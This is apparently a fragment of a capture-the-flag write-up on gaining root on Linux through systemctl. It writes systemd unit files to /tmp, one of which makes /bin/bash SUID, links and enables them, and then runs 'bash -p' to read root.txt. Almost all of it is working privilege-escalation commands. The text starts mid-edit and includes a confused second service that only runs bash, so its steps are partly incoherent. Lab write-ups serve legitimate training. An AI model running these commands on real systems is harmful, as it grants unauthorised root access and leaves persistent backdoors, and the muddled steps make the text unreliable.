echo '[Service]

and change it to

# creating service in /tmp
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /tmp/root-esc.service

# link and run
systemctl link /tmp/root-esc.service
systemctl enable --now /tmp/root-esc.service


if we try to run this we realise there is no service running /bin/bash in privileged mode so we create that

echo -e '[Unit]\nDescription=Elevated Shell\n\n[Service]\nType=oneshot\nExecStart=/bin/bash\n\n[Install]\nWantedBy=multi-user.target' > /tmp/elevated-shell.service

we link the service:
systemctl link /tmp/elevated-shell.service
and enable and start it:
systemctl enable --now elevated-shell.service

now we just have to
/bin/bash -p
and we are root, we can cd to root and cat root.txt
thats it.
